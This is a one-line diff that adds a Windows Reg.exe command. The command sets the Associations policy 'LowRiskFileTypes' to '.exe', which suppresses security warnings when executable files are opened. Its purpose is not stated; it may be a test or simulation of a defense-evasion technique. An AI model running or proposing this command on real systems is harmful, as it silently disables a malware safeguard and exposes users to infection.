@@ -1,0 +1,1 @@
+Reg.exe ADD HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Associations /v LowRiskFileTypes /t REG_SZ /d .exe /f
